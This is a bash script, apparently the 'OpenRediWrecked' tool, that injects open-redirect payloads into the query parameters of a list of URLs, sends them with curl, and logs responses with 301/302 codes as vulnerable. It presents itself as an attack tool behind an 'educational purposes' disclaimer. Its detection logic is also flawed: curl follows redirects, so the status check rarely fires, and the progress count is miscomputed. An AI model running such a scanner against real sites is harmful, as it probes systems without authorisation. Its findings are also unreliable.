#!/bin/bash
curl --silent "https://raw.githubusercontent.com/blackhatethicalhacking/Subdomain_Bruteforce_bheh/main/ascii.sh" | lolcat
echo ""
# Generate a random Sun Tzu quote for offensive security

# Array of Sun Tzu quotes
quotes=("The supreme art of war is to subdue the enemy without fighting." "All warfare is based on deception." "He who knows when he can fight and when he cannot, will be victorious." "The whole secret lies in confusing the enemy, so that he cannot fathom our real intent." "To win one hundred victories in one hundred battles is not the acme of skill. To subdue the enemy without fighting is the acme of skill.")

# Get a random quote from the array
random_quote=${quotes[$RANDOM % ${#quotes[@]}]}

# Print the quote
echo "Offensive security tip: $random_quote - Sun Tzu" | lolcat
sleep 1
echo "MEANS, IT'S ☕ 1337 ⚡ TIME, 369 ☯ " | lolcat
sleep 1
figlet -w 80 -f small OpenRediWrecked | lolcat
echo ""
echo "[YOUR ARE USING OpenRediWrecked.sh] - (v1.0) CODED BY Chris 'SaintDruG' Abou-Chabké WITH ❤ FOR blackhatethicalhacking.com for Educational Purposes only!" | lolcat
sleep 1
#check if the user is connected to the internet
tput bold;echo "CHECKING IF YOU ARE CONNECTED TO THE INTERNET!" | lolcat
# Check connection
wget -q --spider https://google.com
if [ $? -ne 0 ];then
    echo "++++ CONNECT TO THE INTERNET BEFORE RUNNING ScopeHunter.sh!" | lolcat
    exit 1
fi
tput bold;echo "++++ CONNECTION FOUND, LET'S GO!" | lolcat

echo "Enter path to URLs with parameters: "
read urls_file

echo "Enter path to OpenRedirect Payloads: "
read payloads_file

echo "Sorting parameters and adding 'OPENRPAYLOAD' to URLs..."
urls=$(cat $urls_file | sed "s/\?.*/\?OPENRPAYLOAD/g")
echo "Sorting complete. Starting attack..."

echo ""

num_of_urls=0
num_of_vul_urls=0

counter=0
num_of_urls=$(echo "$urls" | wc -l)
num_of_vul_urls=0

while read url
do
  while read payload
  do
    ((counter++))
    response=$(curl -L --silent --write-out "%{http_code}" "${url/$"OPENRPAYLOAD"/$payload}")
    if [ "$response" != "302" ] && [ "$response" != "301" ]; then
      echo -e "\033[32mTesting URL $counter: ${url/$"OPENRPAYLOAD"/$payload}\033[0m"
      echo -e "\033[31mNot Vulnerable\033[0m"
    else
      domain=$(echo "${url/$"OPENRPAYLOAD"/$payload}" | awk -F/ '{print $3}')
      echo -e "\033[32mTesting URL $counter: ${url/$"OPENRPAYLOAD"/$payload}\033[0m"
      echo -e "\033[32mVulnerable\033[0m"
      echo "${url/$"OPENRPAYLOAD"/$payload}" >> "${domain}_vulnerable_urls.txt"
      ((num_of_vul_urls++))
    fi
    
    # Display progress bar
    percentage=$(echo "scale=2; $counter/$num_of_urls*100" | bc)
    num_of_hash=$(echo "($percentage/5)/1" | bc)
    num_of_dot=$(echo "20-$num_of_hash" | bc)
    progress_bar=""
    for i in $(seq 1 $num_of_hash); do progress_bar+="#"; done
    for i in $(seq 1 $num_of_dot); do progress_bar+="."; done
    echo -ne "Progress: [$progress_bar] $percentage%\r"
  done < $payloads_file
done < <(echo "$urls")


echo ""
echo "Attack complete."
echo "Number of URLs tested: $num_of_urls"
echo "Number of vulnerable URLs found: $num_of_vul_urls"
